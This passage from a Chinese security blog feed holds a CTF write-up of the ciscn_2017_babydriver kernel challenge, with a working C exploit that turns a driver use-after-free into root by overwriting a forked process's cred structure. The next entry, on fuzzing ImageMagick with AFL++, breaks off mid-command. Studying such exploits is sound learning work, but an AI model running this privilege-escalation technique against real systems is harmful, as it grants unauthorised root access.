class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/heap_overview/">https://ctf-wiki.org/pwn/linux/glibc-heap/heap_overview/</a></p><p><a href="https://zhuanlan.zhihu.com/p/24790164">https://zhuanlan.zhihu.com/p/24790164</a></p><p><a href="http://blog.leanote.com/post/3191220142@qq.com/Linux%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.md-2">http://blog.leanote.com/post/3191220142@qq.com/Linux%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.md-2</a></p><p><a href="https://lishiwen4.github.io/linux/linux-process-memory-location">https://lishiwen4.github.io/linux/linux-process-memory-location</a></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/97613588">https://blog.csdn.net/qq_41453285/article/details/97613588</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2017_babydriver的几种解法</title>
    <link href="/2021/11/26/ciscn-2017-babydriver%E7%9A%84%E5%87%A0%E7%A7%8D%E8%A7%A3%E6%B3%95/"/>
    <url>/2021/11/26/ciscn-2017-babydriver%E7%9A%84%E5%87%A0%E7%A7%8D%E8%A7%A3%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>最近在屁颠屁颠的学kernel pwn，跟着一些视频、博客搭建环境，学习调试内核。但感觉内核态的漏洞涉及了很多知识点，只能遇到啥去学啥了。</p><p>因此为了巩固每次新学习的知识点，我打算整理好记下来，同时录个视频加强自己的思维理解，当然如果能帮助到其他正在学习的小伙伴那就更好了。</p><h2 id="驱动分析"><a href="#驱动分析" class="headerlink" title="驱动分析"></a>驱动分析</h2><p>ida打开驱动一看，有如下几个功能函数，其中<code>babydriver_init</code>和<code>babydriver_exit</code>函数是用于内核模块的初始化和退出。</p><p><img src="https://i.loli.net/2021/11/26/3PIvoTeEZi1DgOW.png" alt="image-20211126144216043"></p><p>每个函数都过一遍，第一次看感觉好陌生，各种不认识的函数名，那不认识还能怎么办，一个一个查呗，多见几次就熟悉了。</p><h3 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init"></a>babydriver_init</h3><p>首先是babydriver_init函数，反汇编如下</p><p><img src="https://i.loli.net/2021/11/26/EheFxCutDqb61ym.png"></p><ol><li><p>在这个init函数中，<code>alloc_chrdev_region</code>用于动态分配设备编号，在<code>fs/char_dev.c</code>中，成功调用这个函数后babydev_no就存放设备号了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_chrdev_region() - register a range of char device numbers</span><br><span class="hljs-comment"> * @dev: output parameter for first assigned number</span><br><span class="hljs-comment"> * @baseminor: first of the requested range of minor numbers</span><br><span class="hljs-comment"> * @count: the number of minor numbers required</span><br><span class="hljs-comment"> * @name: the name of the associated device or driver</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Allocates a range of char device numbers.  The major number will be</span><br><span class="hljs-comment"> * chosen dynamically, and returned (along with the first minor number)</span><br><span class="hljs-comment"> * in @dev.  Returns zero or a negative error code.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">alloc_chrdev_region</span><span class="hljs-params">(<span class="hljs-keyword">dev_t</span> *dev, <span class="hljs-keyword">unsigned</span> baseminor, <span class="hljs-keyword">unsigned</span> count,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">char_device_struct</span> *<span class="hljs-title">cd</span>;</span><br>cd = __register_chrdev_region(<span class="hljs-number">0</span>, baseminor, count, name);<br><span class="hljs-keyword">if</span> (IS_ERR(cd))<br><span class="hljs-keyword">return</span> PTR_ERR(cd);<br>*dev = MKDEV(cd-&gt;major, cd-&gt;baseminor);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>cdev_init</code>函数用与绑定cdev和file_oprations之前的连接，cdev结构体的定义如下，在源码的<code>include/linux/cdev.h</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cdev</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">owner</span>;</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><span class="hljs-keyword">dev_t</span> dev;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p><code>cdev_init</code>函数在<code>fs/char_dev.c</code>里面，其中file_oprations就是一个类似于虚表的东西，里面存了好多函数指针，<code>cdev-&gt;ops = fops</code>赋值之后这个字符设备就可以调用相关的函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * cdev_init() - initialize a cdev structure</span><br><span class="hljs-comment"> * @cdev: the structure to initialize</span><br><span class="hljs-comment"> * @fops: the file_operations for this device</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Initializes @cdev, remembering @fops, making it ready to add to the</span><br><span class="hljs-comment"> * system with cdev_add().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cdev_init</span><span class="hljs-params">(struct cdev *cdev, <span class="hljs-keyword">const</span> struct file_operations *fops)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">memset</span>(cdev, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> *cdev);<br>INIT_LIST_HEAD(&amp;cdev-&gt;<span class="hljs-built_in">list</span>);<br>kobject_init(&amp;cdev-&gt;kobj, &amp;ktype_cdev_default);<br>cdev-&gt;ops = fops;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>cdev_add</code>函数同样在<code>fs/char_dev.c</code>里面，简单理解它就是完成了cdev和设备号之间的绑定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">cdev_add</span><span class="hljs-params">(struct cdev *p, <span class="hljs-keyword">dev_t</span> dev, <span class="hljs-keyword">unsigned</span> count)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> error;<br><br>p-&gt;dev = dev;<br>p-&gt;count = count;<br><br>error = kobj_map(cdev_map, dev, count, <span class="hljs-literal">NULL</span>,<br> exact_match, exact_lock, p);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br><br>kobject_get(p-&gt;kobj.parent);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说<code>cdev_init</code>建立了字符设备<code>cdev</code>和<code>file_operations</code>之间的联系，<code>cdev_add</code>建立字符设备<code>cdev</code>和设备号的联系，那么这两个函数调用完，从<code>cdev</code>到<code>file_operations</code>及到设备号的联系就建立起来了，所以在内核中有设备号就能找到<code>cdev</code>，有<code>cdev</code>就能找到<code>file_operations</code>。</p></li><li><p>_class_create创建一个设备节点，返回相应的class，再调用device_create注册这个设备节点。这两个函数都定义在头文件<code>include/linux/device.h</code>中。下面引用一段话</p><blockquote><p>我们在刚开始写Linux设备驱动程序的时候， 很多时候都是利用mknod命令手动创建设备节点，实际上Linux内核为我们提供了一组函数，可以用来在模块加载的时候自动在/dev目录下创建相应设 备节点，并在卸载模块时删除该节点，当然前提条件是用户空间移植了udev。</p><p>内核中定义了struct class结构体，顾名思义，<strong>一个struct class结构体类型变量对应一个类</strong>， 内核同时提供了class_create(…)函数，可以用它来创建一个类，这个类存放于sysfs下面，一旦创建好了这个类，再调用 device_create(…)函数来在/dev目录下创建相应的设备节点。这样，加载模块的时候，用户空间中的udev会自动响应 device_create(…)函数，去/sysfs下寻找对应的类从而创建设备节点。</p></blockquote></li></ol><p>每个地方失败都会有回滚操作(destroy或者unregister)</p><h3 id="babydriver-exit"><a href="#babydriver-exit" class="headerlink" title="babydriver_exit"></a>babydriver_exit</h3><p><code>exit</code>函数就跟<code>init</code>函数正好相反，你注册，我就卸载，看函数名字也能看出来它是设备卸载时候会调用的，会把分配的设备和class等回收</p><p><img src="https://i.loli.net/2021/12/03/WKXd68cFIgpOywu.png"></p><h3 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h3><p>open函数的参数有<code>inode</code>和<code>filp</code>，每一个设备都会对应一个inode，而且是共享一个inode，这个不像filp文件指针每次打开一个设备都会创建一个新的文件指针以供操作(内核里的文件指针，跟用户态不一样)</p><p><img src="https://i.loli.net/2021/12/03/cEBsmrXKCRLWz8x.png"></p><h3 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h3><p><code>read</code>函数是从内核往用户态读数据，kernel里的文件结构体定义了一组基础接口，允许开发者按照参数的标准实现一套自己的函数，<code>read write open release(close)</code>都是自己实现的，这里的read判断<code>babydev_struct.device_buf</code>不为NULL就将用户输入的第三个参数length长的数据从<code>device_buf</code>拷贝到<code>Buffer</code>里</p><p><img src="https://i.loli.net/2021/11/26/E9bopLP2H13CWgw.png"></p><p>其实<code>babyread</code>和<code>babywrite</code>中实现了常规的<code>copy_from_user</code>和<code>copy_to_user</code>，限制了读取大小最多为<code>babydev_struct.device_buf_len</code>。</p><h3 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h3><p>ioctl是最简单的和设备通信的方式，开发者可以在其中根据arg参数决定对设备不同的操作，在babyioctl中存在一个指令0x10001，这个指令可以重新制定堆块大小，将原有的内存释放，重新申请新的堆空间。</p><p><img src="https://i.loli.net/2021/11/26/4cIrTwA2u61NmaG.png" alt="image-20211126162058591"></p><h3 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h3><p>release函数调用发生在关闭设备文件的时候，这里会free掉buf</p><p><img src="https://i.loli.net/2021/11/26/tDToXgYA4b8nWyG.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里的漏洞是因为在驱动中没有处理好并发，全局变量在两次打开设备文件的时候是共享的，当对同一文件打开多次时，<code>babydev_struct.device_buf</code>会被不断覆写，而在<code>babyrelease</code>时，会释放掉全部文件共享的缓冲区。而由于存在设置大小的函数，从而可以造成任意大小堆块的UAF漏洞。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>我们有了uaf漏洞，如果使某个进程的cred结构体被放进这个UAF的空间，然后通过write把uid覆写为0，就可以提权了，关于cred结构体可用<a href="https://verf1sh.github.io/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E5%87%AD%E8%AF%81">参考这里</a>。那么如何控制cred结构？我们首先通过ioctl改变大小，使得buf和cred结构大小一样，接下来只需要在触发UAF的时候新建一个cred结构，新建的cred结构就很有可能被放进这个UAF的空间里，新建进程的时候就会涉及cred结构体的申请，那么fork就解决了</p><h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>查看一下驱动，只有NX保护打开了</p><p><img src="https://i.loli.net/2021/11/26/nBNH15Ljvui4h9M.png" alt="image-20211126163619638"></p><p>打包脚本pack.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>cp -r rootfs rootfs_tmp<br><span class="hljs-comment"># cp -r etc rootfs_tmp/</span><br>cp init rootfs_tmp/<br>cp babydriver.ko rootfs_tmp/<br><br>gcc -g -static exp.c -o exp<br>cp exp rootfs_tmp/<br><br>chmod +x rootfs_tmp/init<br>chmod g-w -R rootfs_tmp/<br>chmod o-w -R rootfs_tmp/<br>sudo chown -R root rootfs_tmp/<br>sudo chgrp -R root rootfs_tmp/<br>sudo chmod u+s rootfs_tmp/bin/busybox<br><br><span class="hljs-built_in">cd</span> rootfs_tmp/<br>find . | cpio -o -H newc &gt; ../rootfs.cpio<br><span class="hljs-built_in">cd</span> ..<br><br>sudo rm -rf rootfs_tmp/<br></code></pre></td></tr></table></figure><p>qemu启动脚本start.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><br>qemu-system-x86_64 \<br>-m 1024M \<br>-cpu kvm64,+smep\<br>-kernel ./babydriver/bzImage \<br>-initrd ./babydriver/rootfs.cpio \<br>-nographic \<br>-monitor none \<br>-append <span class="hljs-string">&quot;console=ttyS0 nokaslr quiet&quot;</span> \<br>--enable-kvm -s<br></code></pre></td></tr></table></figure><p>init启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>chown root:root flag<br>chmod 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br>chmod 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>gdb调试脚本</p><p>vmlinux-to-elf工具可用从内核中提取到带符号的vmlinux</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vmlinux-to-elf bzImage vmlinux<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>gdb -q \<br>-ex <span class="hljs-string">&quot;file vmlinux&quot;</span>\<br>-ex <span class="hljs-string">&quot;set architecture i386:x86-64&quot;</span>\<br>-ex <span class="hljs-string">&quot;add-symbol-file babydriver.ko 0xffffffffc0000000&quot;</span>\<br>-ex <span class="hljs-string">&quot;target remote localhost:1234&quot;</span><br></code></pre></td></tr></table></figure><p>启动内核之后再运行gdb调试脚本，先下两个断点，再按c</p><p><img src="https://i.loli.net/2021/11/26/61duVwijf4W7ne8.png"></p><p>然后再运行exp</p><p><img src="https://i.loli.net/2021/11/26/VQCUvldZN5m4iTX.png" alt="image-20211126172539904"></p><p>这样就可以断下来了，在kmalloc函数前停一下，rdi是0xa8正好是cred结构体的大小，同时注意他执行完的返回值rax为<strong>0xffff88003cce3f00</strong>，那么这个地址大概就相当于用户态执行完malloc返回的堆地址（现在对内核中的内存不配还不是很熟悉，只能根据用户态的思维来猜测了）。</p><p><img src="https://i.loli.net/2021/11/29/GiHZuh1bTyIlSrP.png" alt="image-20211129160630007"></p><p><img src="https://i.loli.net/2021/11/26/26bMHJBQlRP4txE.png" alt="image-20211126173400995"></p><p>然后按c，运行到babyrelease函数，在kfree那里停一下，观察rdi，发现也是<strong>0xffff88003cce3f00</strong>，用户态free的第一个参数也是堆块地址，free掉之后那么这段内存区域应该就是空闲的了，然后下次如果需要分配和0xa8大小相近的内存内核就有可能把这个空闲的堆块继续分配出去。</p><p><img src="https://i.loli.net/2021/11/29/RKpZ82xnbh6gjG7.png"></p><p>按照exp的流程，程序马上就要执行fork了,用户态的fork函数最终会调用内核里的do_fork，在do_fork函数里调用copy_process函数来创建子进程的进程描述符以及相关的数据结构。这个函数代码量很多，也比较复杂，就不多说了（贴个<a href="http://edsionte.com/techblog/archives/2141">链接</a>感兴趣的可以看看）。fork调用流程参考](<a href="https://verf1sh.github.io/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/#%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6">https://verf1sh.github.io/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/#%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6</a>)</p><p>于是在pwndbg里面在copy_process函数下个断点，运行过去</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">b copy_process<br>c<br></code></pre></td></tr></table></figure><p>此时这个内存地址还啥内容都没有</p><p><img src="https://i.loli.net/2021/11/29/dGZBijPYtykXgoH.png" alt="image-20211129162154761"></p><p>那么我们就再finish指令执行完copy_process函数，这时可以看到，这个内存地址里多了很多内容</p><p><img src="https://i.loli.net/2021/11/29/F9ehRB4EYdU8Ios.png" alt="image-20211129162045571"></p><p>若前面的都没错，那么再调用babywrite函数的时候，我们就有机会对cred进行写操作了，下个断点</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">b babywrite<br>c<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/29/yrLoUj71Kt9nYVe.png" alt="image-20211129163611100"></p><p>马上就要执行<code>_copy_from_user</code>函数了，rsi就是我们exp里定义的zeros数组地址，初始化了28个0，那么就看看这个函数执行完之后，内存地址是啥样的。3*8+4正好是28个0。</p><p><img src="https://i.loli.net/2021/11/29/uTG38qNi2InX9Dw.png" alt="image-20211129163929714"></p><p>最后执行完用户态的system(“/bin/sh”)就有了root的shell了</p><p><img src="https://i.loli.net/2021/11/29/jWumwtFnNxlqSBI.png" alt="image-20211129192113396"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stropts.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 打开两次设备</span><br><span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br><span class="hljs-comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span><br>ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0xa8</span>);<br><br><span class="hljs-comment">// 释放 fd1</span><br>close(fd1);<br><br><span class="hljs-comment">// cred结构体和刚刚释放的babydev_struct大小相等</span><br><span class="hljs-comment">//按照用户态堆块分配规则的话，新起进程的cred会把刚刚释放的babydev_struct申请回来</span><br><span class="hljs-keyword">int</span> pid = fork();<br><span class="hljs-keyword">if</span>(pid &lt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fork error!&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span><br><span class="hljs-keyword">char</span> zeros[<span class="hljs-number">30</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>write(fd2, zeros, <span class="hljs-number">28</span>);<br><br><span class="hljs-keyword">if</span>(getuid() == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] root now.&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">else</span><br>&#123;<br>wait(<span class="hljs-literal">NULL</span>);<br>&#125;<br>close(fd2);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/HdXa20H57rBki5_K_ex67A">https://mp.weixin.qq.com/s/HdXa20H57rBki5_K_ex67A</a></p><p><a href="https://www.anquanke.com/post/id/255884">https://www.anquanke.com/post/id/255884</a></p><p><a href="https://www.anquanke.com/post/id/86490">https://www.anquanke.com/post/id/86490</a></p><p><a href="https://ama2in9.top/2020/09/03/kernel/">https://ama2in9.top/2020/09/03/kernel/</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL++ 挖掘ImageMagick</title>
    <link href="/2021/11/23/AFL-%E6%8C%96%E6%8E%98ImageMagick/"/>
    <url>/2021/11/23/AFL-%E6%8C%96%E6%8E%98ImageMagick/</url>
    
    <content type="html"><![CDATA[<h2 id="安装AFL"><a href="#安装AFL" class="headerlink" title="安装AFL++"></a>安装AFL++</h2><p>方便起见，直接用官方提供的docker镜像，两条命令即可，docker使用的是ubuntu20的版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker pull aflplusplus/aflplusplus<br>docker run -ti -v /location/of/your/target:/src aflplusplus/aflplusplus<br></code></pre></td></tr></table></figure><p>我这里使用的是：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker run -ti --privileged=<span class="hljs-literal">true</span> -v /root/fuzz:/root/fuzz aflplusplus/aflplusplus<br></code></pre></td></tr></table></figure><p>进去之后再给apt换个源</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vim /etc/apt/sources.list<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-updates multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security universe<br>deb http://mirrors.aliyun.com/ubuntu/ focal-security multiverse<br></code></pre></td></tr></table></figure><p>wq保存后，再<code>apt update</code></p><h2 id="ImageMagick安装"><a href="#ImageMagick安装" class="headerlink" title="ImageMagick安装"></a>ImageMagick安装</h2><p>ImageMagick是一款免费开源的图片编辑软件，可以通过命令行就完成一些图片转换的操作，比如jpg -&gt; png</p><p>使用以下命令进行下载、编译和安装</p><blockquote><p>afl-clang-lto/afl-clang-lto++是clang/clang++ 11+以上版本使用的插桩方式</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/ImageMagick/ImageMagick.git<br><span class="hljs-built_in">cd</span> ImageMagick/<br>CC=<span class="hljs-string">&quot;afl-clang-lto&quot;</span> CXX=<span class="hljs-string">&quot;afl-clang-lto++&quot;</span> ./configure --disable-shared<br>AFL_USE_ASAN=1 make 